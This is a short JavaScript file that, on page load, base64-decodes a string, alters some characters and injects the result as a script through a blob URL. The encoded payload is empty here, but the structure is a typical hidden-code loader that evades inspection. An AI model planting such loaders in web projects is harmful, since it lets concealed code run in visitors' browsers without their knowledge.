/// jaja9.js
document.addEventListener('DOMContentLoaded', function () {
const fallback2 = atob("").replace(/Ã/g, '×');
const blob = new Blob([fallback2], { type: 'text/javascript' });
const blobUrl = URL.createObjectURL(blob);
const script = document.createElement('script');
script.src = blobUrl;
document.body.appendChild(script);
});
